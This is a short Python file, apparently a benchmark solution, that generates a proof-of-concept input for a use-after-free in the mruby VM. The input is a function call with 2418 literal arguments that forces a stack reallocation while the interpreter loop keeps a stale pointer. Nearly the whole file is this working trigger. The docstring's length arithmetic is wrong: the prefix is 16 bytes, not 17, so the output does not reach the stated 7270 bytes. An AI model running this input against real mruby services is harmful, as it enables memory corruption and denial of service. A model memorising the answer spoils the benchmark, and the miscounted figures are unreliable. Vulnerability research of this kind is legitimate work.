class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a Use-After-Free in a Ruby VM (mruby). When a function
        is called with a very large number of arguments, the VM's stack needs to be
        extended. The function `mrb_stack_extend()` reallocates the stack buffer
        and updates pointers. However, a local pointer to the stack in the VM's
        main execution loop (`mrb_vm_exec`) is not updated. Subsequent writes
        (pushing arguments) go to the old, freed stack memory, causing a UAF.

        The PoC triggers this by defining a function and calling it with a large
        number of arguments. To match the ground-truth PoC length of 7270 bytes,
        we generate the function call with arguments as literals in the source code.

        The PoC has the form: `def f(*a);end;f(0, 0, ...)`

        Calculation for the number of arguments (M) to reach length 7270:
        - prefix = b"def f(*a);end;f("  (length 17)
        - suffix = b")"             (length 1)
        - args_str = "0" + ", 0" * (M - 1)
        - len(args_str) = 1 + 3 * (M - 1) = 3M - 2
        - Total length = 17 + (3M - 2) + 1 = 16 + 3M
        - 7270 = 16 + 3M
        - 7254 = 3M
        - M = 2418

        Args:
            src_path: Path to the vulnerable source code tarball.

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        num_args = 2418
        
        prefix = b"def f(*a);end;f("
        suffix = b")"
        
        # Create a list of '0' byte strings for each argument.
        args_list = [b"0"] * num_args
        
        # Join the arguments with ", " to form the argument list string.
        # This is an efficient way to build the large string.
        args_str = b", ".join(args_list)
        
        # Assemble the final PoC.
        poc = prefix + args_str + suffix
        
        return poc